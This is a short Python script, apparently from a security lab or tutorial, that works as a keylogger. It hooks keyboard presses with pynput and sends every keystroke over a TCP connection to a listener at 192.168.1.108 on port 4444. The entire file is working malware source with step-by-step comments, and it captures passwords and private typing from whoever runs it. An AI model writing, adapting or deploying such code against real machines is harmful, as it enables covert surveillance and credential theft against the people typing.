import socket  #used to exchange data between to endpoints
import pynput  #used to monitor and control input devices
from pynput.keyboard import Key, Listener  #import classes that we need for monitoring the keyboard


serverADDR = '192.168.1.108'  #our linux machine IP address
serverPORT =  4444 #the listening port

mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #IPv4  -  use tcp 
mysocket.connect((serverADDR, serverPORT))  #establish the connection to the srver

def sendkey(key):       #function created to send keystrokes
    msg=(str(key)+"\n").encode()
    mysocket.sendall(msg)

with Listener(on_press=sendkey) as listener: #whenever a key is pressed we call the send_key function   
    listener.join()
